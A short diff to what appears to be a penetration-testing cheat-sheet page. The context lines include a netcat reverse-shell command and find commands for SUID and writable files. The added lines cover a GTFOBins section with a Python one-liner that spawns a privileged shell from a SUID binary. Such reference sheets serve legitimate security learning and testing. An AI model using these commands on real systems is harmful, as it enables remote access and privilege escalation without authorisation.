@@ -34,3 +34,13 @@ sidebar_position: 1
 - `nc -e /bin/sh <your-ip> <port>` - Get reverse shell via netcat.
 - `find / -perm -4000 -type f 2>/dev/null` - Find SUID files. Useful for previlege escalation.
 - `find / -writable -type  f 2>/dev/null | grep -v "/proc/"` - Find files with writable permissions. Useful for previlege escalation.
+
+## GTFOBins
+- GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.
+
+### Python
+- SUID files.
+    ```
+    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+    ```
+- Read more: https://gtfobins.github.io/gtfobins/python/
